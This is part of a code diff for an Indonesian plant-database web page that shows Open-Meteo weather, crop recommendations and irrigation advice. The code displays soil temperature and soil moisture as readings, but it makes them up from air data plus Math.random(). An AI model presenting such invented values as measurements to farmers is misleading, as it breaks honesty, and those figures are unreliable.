+        { id: 5, name: "Ubi Jalar", category: "padi", latin: "Ipomoea batatas", season: "semua musim", duration: "3-4 bulan", tempMin: 22, tempMax: 28, altitude: "0-1000 mdpl", icon: "🍠", yield: "15-25 ton/ha", desc: "Sumber karbohidrat", fertilizer: "Pupuk kandang 10-15 ton" },
+        // SAYURAN
+        { id: 6, name: "Cabai Merah", category: "sayur", latin: "Capsicum annuum", season: "musim kemarau", duration: "3-4 bulan", tempMin: 24, tempMax: 28, altitude: "0-1200 mdpl", icon: "🌶️", yield: "10-15 ton/ha", desc: "Cabai premium", fertilizer: "NPK 400kg, Urea 200kg" },
+        { id: 7, name: "Tomat", category: "sayur", latin: "Solanum lycopersicum", season: "musim kemarau", duration: "3-4 bulan", tempMin: 20, tempMax: 27, altitude: "200-1000 mdpl", icon: "🍅", yield: "20-30 ton/ha", desc: "Buah sayur serbaguna", fertilizer: "NPK 300kg, Urea 150kg" },
+        { id: 8, name: "Bawang Merah", category: "sayur", latin: "Allium cepa", season: "musim kemarau", duration: "2-3 bulan", tempMin: 25, tempMax: 32, altitude: "0-800 mdpl", icon: "🧅", yield: "10-15 ton/ha", desc: "Bumbu dapur utama", fertilizer: "NPK 300kg, Urea 150kg" },
+        { id: 9, name: "Kentang", category: "sayur", latin: "Solanum tuberosum", season: "musim hujan", duration: "3-4 bulan", tempMin: 15, tempMax: 20, altitude: "1000-2000 mdpl", icon: "🥔", yield: "20-25 ton/ha", desc: "Sumber karbohidrat", fertilizer: "NPK 500kg, Urea 200kg" },
+        { id: 10, name: "Kangkung", category: "sayur", latin: "Ipomoea aquatica", season: "semua musim", duration: "1-2 bulan", tempMin: 20, tempMax: 30, altitude: "0-500 mdpl", icon: "🌿", yield: "15-20 ton/ha", desc: "Cepat panen", fertilizer: "Pupuk organik 5-10 ton" },
+        { id: 11, name: "Bayam", category: "sayur", latin: "Amaranthus sp.", season: "semua musim", duration: "1-2 bulan", tempMin: 20, tempMax: 28, altitude: "0-1000 mdpl", icon: "🍃", yield: "10-15 ton/ha", desc: "Kaya zat besi", fertilizer: "Urea 100kg, pupuk kandang 5 ton" },
+        { id: 12, name: "Terong", category: "sayur", latin: "Solanum melongena", season: "musim kemarau", duration: "3-4 bulan", tempMin: 22, tempMax: 30, altitude: "0-800 mdpl", icon: "🍆", yield: "20-30 ton/ha", desc: "Sayuran buah", fertilizer: "NPK 300kg, Urea 150kg" },
+        // BUAH-BUAHAN
+        { id: 13, name: "Mangga", category: "buah", latin: "Mangifera indica", season: "musim kemarau", duration: "3-5 tahun", tempMin: 24, tempMax: 30, altitude: "0-500 mdpl", icon: "🥭", yield: "10-20 ton/ha", desc: "Buah tropis", fertilizer: "Pupuk organik 20-30 kg/pohon" },
+        { id: 14, name: "Pisang", category: "buah", latin: "Musa paradisiaca", season: "semua musim", duration: "9-12 bulan", tempMin: 25, tempMax: 30, altitude: "0-800 mdpl", icon: "🍌", yield: "25-35 ton/ha", desc: "Buah serbaguna", fertilizer: "NPK 500kg, Urea 300kg" },
+        { id: 15, name: "Jeruk", category: "buah", latin: "Citrus reticulata", season: "musim hujan", duration: "2-3 tahun", tempMin: 25, tempMax: 30, altitude: "0-600 mdpl", icon: "🍊", yield: "15-20 ton/ha", desc: "Vitamin C tinggi", fertilizer: "NPK 400kg, pupuk kandang 15kg" },
+        { id: 16, name: "Semangka", category: "buah", latin: "Citrullus lanatus", season: "musim kemarau", duration: "3-4 bulan", tempMin: 25, tempMax: 30, altitude: "0-500 mdpl", icon: "🍉", yield: "30-40 ton/ha", desc: "Buah segar", fertilizer: "NPK 300kg, Urea 150kg" },
+        // PERKEBUNAN
+        { id: 17, name: "Kelapa Sawit", category: "perkebunan", latin: "Elaeis guineensis", season: "semua musim", duration: "25-30 tahun", tempMin: 24, tempMax: 28, altitude: "0-500 mdpl", icon: "🌴", yield: "20-25 ton/ha", desc: "Ekspor utama", fertilizer: "NPK 500kg, Urea 300kg" },
+        { id: 18, name: "Kopi Arabika", category: "perkebunan", latin: "Coffea arabica", season: "musim hujan", duration: "3-4 tahun", tempMin: 18, tempMax: 22, altitude: "1000-2000 mdpl", icon: "☕", yield: "0.8-1.2 ton/ha", desc: "Kopi premium", fertilizer: "Pupuk organik 15kg/pohon" },
+        // REMPAH
+        { id: 19, name: "Jahe", category: "rempah", latin: "Zingiber officinale", season: "musim hujan", duration: "8-10 bulan", tempMin: 25, tempMax: 30, altitude: "0-1000 mdpl", icon: "🟤", yield: "15-20 ton/ha", desc: "Rempah serbaguna", fertilizer: "Pupuk organik 15-20 ton" },
+        { id: 20, name: "Kunyit", category: "rempah", latin: "Curcuma longa", season: "musim hujan", duration: "8-10 bulan", tempMin: 25, tempMax: 30, altitude: "0-800 mdpl", icon: "🟡", yield: "10-15 ton/ha", desc: "Obat tradisional", fertilizer: "Pupuk organik 10-15 ton" }
+    ];
+
+    // State untuk database
+    let currentCategory = 'all';
+    let currentSeason = 'all';
+    let currentSearch = '';
+    let currentPage = 1;
+    const itemsPerPage = 12;
+
+    document.getElementById('statsBar').innerHTML = `🌾 Database Tanaman Indonesia SUPER LENGKAP | Total ${plantsDatabase.length} Tanaman | 5 Kategori | Data Cuaca Open-Meteo API`;
+
+    // Filter functions
+    function filterPlants() {
+        currentSearch = document.getElementById('searchInput').value.toLowerCase();
+        currentPage = 1;
+        displayPlants();
+    }
+
+    function filterByCategory(category) {
+        currentCategory = category;
+        currentPage = 1;
+        displayPlants();
+        document.querySelectorAll('#categoryFilters .filter-btn').forEach(btn => btn.classList.remove('active'));
+        event.target.classList.add('active');
+    }
+
+    function filterBySeason(season) {
+        currentSeason = season;
+        currentPage = 1;
+        displayPlants();
+    }
+
+    function getFilteredPlants() {
+        let filtered = plantsDatabase;
+        if (currentCategory !== 'all') filtered = filtered.filter(p => p.category === currentCategory);
+        if (currentSeason !== 'all') filtered = filtered.filter(p => p.season === currentSeason);
+        if (currentSearch) filtered = filtered.filter(p => p.name.toLowerCase().includes(currentSearch) || p.latin.toLowerCase().includes(currentSearch));
+        return filtered;
+    }
+
+    function displayPlants() {
+        const filtered = getFilteredPlants();
+        const totalPages = Math.ceil(filtered.length / itemsPerPage);
+        const start = (currentPage - 1) * itemsPerPage;
+        const pagePlants = filtered.slice(start, start + itemsPerPage);
+        
+        const grid = document.getElementById('plantsGrid');
+        if (pagePlants.length === 0) {
+            grid.innerHTML = '<div style="text-align: center; padding: 2rem;">🌿 Tidak ada tanaman yang ditemukan</div>';
+            return;
+        }
+        
+        grid.innerHTML = pagePlants.map(plant => `
+            <div class="plant-card" onclick="showPlantDetail(${plant.id})">
+                <div class="plant-header">
+                    <div class="plant-icon">${plant.icon}</div>
+                    <div class="plant-name">${plant.name}</div>
+                </div>
+                <div class="plant-body">
+                    <p><em>${plant.latin}</em></p>
+                    <p>📅 ${plant.duration}</p>
+                    <p>🌡️ ${plant.tempMin}°C - ${plant.tempMax}°C</p>
+                    <p>🏔️ ${plant.altitude}</p>
+                    <span class="season-badge season-${plant.season === 'musim hujan' ? 'hujan' : plant.season === 'musim kemarau' ? 'kemarau' : 'semua'}">
+                        ${plant.season === 'musim hujan' ? '🌧️ Musim Hujan' : plant.season === 'musim kemarau' ? '☀️ Musim Kemarau' : '🌿 Semua Musim'}
+                    </span>
+                    <p style="margin-top:0.5rem;">📊 ${plant.yield}</p>
+                </div>
+            </div>
+        `).join('');
+        
+        const paginationDiv = document.getElementById('pagination');
+        if (totalPages > 1) {
+            let pages = '';
+            for (let i = 1; i <= Math.min(totalPages, 10); i++) {
+                pages += `<button class="page-btn ${i === currentPage ? 'active' : ''}" onclick="goToPage(${i})">${i}</button>`;
+            }
+            paginationDiv.innerHTML = pages;
+        } else {
+            paginationDiv.innerHTML = '';
+        }
+    }
+
+    function goToPage(page) { currentPage = page; displayPlants(); }
+
+    function showPlantDetail(id) {
+        const plant = plantsDatabase.find(p => p.id === id);
+        if (!plant) return;
+        document.getElementById('modalIcon').innerHTML = plant.icon;
+        document.getElementById('modalTitle').innerHTML = plant.name;
+        document.getElementById('modalLatin').innerHTML = plant.latin;
+        document.getElementById('modalBody').innerHTML = `
+            <div style="display:grid;gap:0.8rem;">
+                <div><strong>📋 Deskripsi:</strong> ${plant.desc}</div>
+                <div><strong>📅 Masa Tanam:</strong> ${plant.duration}</div>
+                <div><strong>🌡️ Suhu Optimal:</strong> ${plant.tempMin}°C - ${plant.tempMax}°C</div>
+                <div><strong>🏔️ Ketinggian Optimal:</strong> ${plant.altitude}</div>
+                <div><strong>📊 Produktivitas:</strong> ${plant.yield}</div>
+                <div><strong>🧪 Rekomendasi Pupuk:</strong> ${plant.fertilizer}</div>
+            </div>
+            <div style="margin-top:1rem;padding:1rem;background:#e8f5e9;border-radius:10px;">
+                <strong>💡 Tips Budidaya:</strong><br>
+                • Waktu tanam terbaik: ${plant.season === 'musim hujan' ? 'Awal musim hujan (Oktober-Desember)' : plant.season === 'musim kemarau' ? 'Awal musim kemarau (April-Juni)' : 'Dapat ditanam sepanjang tahun'}<br>
+                • Jarak tanam: Sesuaikan dengan jenis tanaman<br>
+                • Perawatan: Lakukan pemupukan rutin dan pengendalian hama terpadu
+            </div>
+        `;
+        document.getElementById('plantModal').style.display = 'flex';
+    }
+
+    function closeModal() { document.getElementById('plantModal').style.display = 'none'; }
+
+    // Weather functions
+    function getWeatherDescription(code) {
+        const weatherCodes = {0:{desc:"Cerah",icon:"☀️"},1:{desc:"Cerah Berawan",icon:"🌤️"},2:{desc:"Berawan",icon:"⛅"},3:{desc:"Mendung",icon:"☁️"},45:{desc:"Kabut",icon:"🌫️"},61:{desc:"Hujan Ringan",icon:"🌦️"},63:{desc:"Hujan Sedang",icon:"🌧️"},65:{desc:"Hujan Lebat",icon:"🌧️"},95:{desc:"Badai Petir",icon:"⛈️"}};
+        return weatherCodes[code] || {desc:"Normal",icon:"🌤️"};
+    }
+
+    async function fetchWeatherData() {
+        const lat = document.getElementById('latitude').value;
+        const lon = document.getElementById('longitude').value;
+        const locationName = document.getElementById('locationSelect').options[document.getElementById('locationSelect').selectedIndex]?.text || `${lat}, ${lon}`;
+        try {
+            const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,relative_humidity_2m,weather_code,cloud_cover,pressure_msl,wind_speed_10m&daily=temperature_2m_max,temperature_2m_min,weather_code,precipitation_sum,et0_fao_evapotranspiration,uv_index_max,sunrise,sunset&timezone=auto&forecast_days=7`;
+            const response = await fetch(url);
+            const data = await response.json();
+            if (data.error) throw new Error(data.reason);
+            
+            const current = data.current;
+            const weatherInfo = getWeatherDescription(current.weather_code);
+            document.getElementById('locationName').innerHTML = locationName;
+            document.getElementById('weatherIcon').innerHTML = weatherInfo.icon;
+            document.getElementById('temperature').innerHTML = `${current.temperature_2m}°C`;
+            document.getElementById('weatherDesc').innerHTML = weatherInfo.desc;
+            document.getElementById('humidity').innerHTML = current.relative_humidity_2m;
+            document.getElementById('windSpeed').innerHTML = current.wind_speed_10m;
+            document.getElementById('pressure').innerHTML = current.pressure_msl;
+            document.getElementById('cloudCover').innerHTML = current.cloud_cover;
+            
+            const daily = data.daily;
+            if (daily) {
+                document.getElementById('uvIndex').innerHTML = daily.uv_index_max?.[0] || '--';
+                document.getElementById('et0').innerHTML = daily.et0_fao_evapotranspiration?.[0] || '--';
+                if (daily.sunrise && daily.sunset) {
+                    document.getElementById('sunrise').innerHTML = new Date(daily.sunrise[0]).toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
+                    document.getElementById('sunset').innerHTML = new Date(daily.sunset[0]).toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
+                }
+            }
+            
+            document.getElementById('soilTemp').innerHTML = (current.temperature_2m - 2 + Math.random() * 4).toFixed(1);
+            document.getElementById('soilMoisture').innerHTML = Math.min(100, Math.max(10, current.relative_humidity_2m - 20 + Math.random() * 15)).toFixed(0);
+            
+            updateDailyForecast(data);
+            updatePlantRecommendations(current);
+            updateSoilInfo(data);
+        } catch (error) {
+            document.getElementById('currentWeatherCard').innerHTML = `<div style="padding:1rem;color:red;">❌ Gagal memuat data cuaca</div>`;
+        }
+    }
+    
+    function updateDailyForecast(data) {
+        const daily = data.daily;
+        const forecastDiv = document.getElementById('dailyForecast');
+        if (!daily?.time) { forecastDiv.innerHTML = '<div>Data tidak tersedia</div>'; return; }
+        let html = '';
+        for (let i = 0; i < Math.min(daily.time.length, 7); i++) {
+            const date = new Date(daily.time[i]);
+            const dayName = date.toLocaleDateString('id-ID',{weekday:'short',day:'numeric',month:'short'});
+            const weatherInfo = getWeatherDescription(daily.weather_code[i]);
+            html += `<div class="forecast-card">
+                <div class="forecast-date">${dayName}</div>
+                <div style="font-size:2rem;">${weatherInfo.icon}</div>
+                <div class="forecast-temp">${daily.temperature_2m_max[i]}° / ${daily.temperature_2m_min[i]}°</div>
+                <div>${weatherInfo.desc}</div>
+                <div>🌧️ ${daily.precipitation_sum?.[i] || 0} mm</div>
+            </div>`;
+        }
+        forecastDiv.innerHTML = html;
+    }
+    
+    function updatePlantRecommendations(current) {
+        const temp = current.temperature_2m;
+        const rain = current.precipitation || 0;
+        const humidity = current.relative_humidity_2m;
+        let season = rain > 5 || humidity > 80 ? 'musim hujan' : 'musim kemarau';
+        let recommended = plantsDatabase.filter(plant => temp >= plant.tempMin && temp <= plant.tempMax && (plant.season === 'semua musim' || plant.season === season)).slice(0, 8);
+        document.getElementById('plantRecommendation').innerHTML = `
+            <p style="margin-bottom:1rem;">💡 Berdasarkan suhu ${temp}°C dan kondisi cuaca, berikut tanaman yang cocok:</p>
+            <div class="plant-recommendation-grid">
+                ${recommended.map(plant => `<div class="plant-rec-card" onclick="showPlantDetail(${plant.id})"><div style="font-size:2rem;">${plant.icon}</div><div style="font-weight:bold;">${plant.name}</div><div>${plant.tempMin}°C - ${plant.tempMax}°C</div></div>`).join('')}
+            </div>
+        `;
+    }
+    
+    function updateSoilInfo(data) {
+        const daily = data.daily;
+        const et0 = daily?.et0_fao_evapotranspiration?.[0] || 0;
+        const rainSum = daily?.precipitation_sum?.[0] || 0;
+        let advice = et0 > 5 ? '⚠️ Evapotranspirasi tinggi, butuh irigasi tambahan' : et0 > 3 ? '🌱 Evapotranspirasi sedang' : '✅ Evapotranspirasi rendah';
+        if (rainSum > 20) advice += ' 🌧️ Curah hujan tinggi, kurangi irigasi';
+        document.getElementById('irrigationAdvice').innerHTML = `<p><strong>📊 ET₀:</strong> ${et0} mm/hari | <strong>🌧️ Curah Hujan:</strong> ${rainSum} mm</p><p>${advice}</p><p>✨ Tips: Pengecekan kelembaban tanah secara rutin.</p>`;
+    }
+    
+    function updateLocationFromSelect() {
+        const [lat, lon] = document.getElementById('locationSelect').value.split(',');
+        document.getElementById('latitude').value = lat;
+        document.getElementById('longitude').value = lon;
+        fetchWeatherData();
+    }
+    
+    displayPlants();
+    fetchWeatherData();
+</script>
 </body>
 </html>
